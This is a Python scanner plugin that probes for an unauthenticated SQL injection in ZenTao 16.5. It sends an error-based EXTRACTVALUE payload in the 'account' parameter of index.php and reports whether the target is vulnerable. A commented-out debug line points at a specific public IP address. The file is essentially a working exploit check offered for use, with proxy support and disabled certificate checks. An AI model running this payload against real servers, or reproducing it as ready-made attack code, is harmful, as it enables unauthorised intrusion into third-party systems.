import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        gf = requests.get(url+"index.php?account=admin'+AND+EXTRACTVALUE(6363,CONCAT(0x5c,0x71706a6a6b71,(SELECT+(ELT(6363%3d6363,1))),0x716a707a71))+AND'gEIB'%3d'gEIB",cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if gf.status_code == 200 and '\\qpjjkq1qjpzq' in gf.text:
            uia = "[+]漏洞存在\nindex.php?account=admin'+AND+EXTRACTVALUE(6363,CONCAT(0x5c,0x71706a6a6b71,(SELECT+(ELT(6363%3d6363,1))),0x716a707a71))+AND'gEIB'%3d'gEIB\n"+gf.text
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('https://58.63.47.210:14430/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ 禅道16.5 前台SQL注入漏洞 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)